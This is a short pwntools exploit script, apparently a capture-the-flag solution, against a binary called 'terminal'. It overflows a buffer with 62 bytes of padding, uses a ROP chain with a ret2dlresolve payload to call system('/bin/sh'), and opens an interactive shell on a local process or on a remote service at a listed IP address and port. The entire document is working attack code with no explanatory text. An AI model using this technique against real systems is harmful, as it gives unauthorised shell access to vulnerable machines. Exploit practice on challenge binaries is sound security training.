from pwn import *

elf = context.binary = ELF('deploy/source/terminal', checksec=False)

sh = process('deploy/source/terminal')

if args.REMOTE:
	sh = remote("20.199.76.210",1005)

rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 62)
rop.read(0, dlresolve.data_addr) 
rop.ret2dlresolve(dlresolve)

log.info(rop.dump())

print(sh.recv())
sh.sendline(rop.chain())
sh.sendline(dlresolve.payload)

sh.interactive()
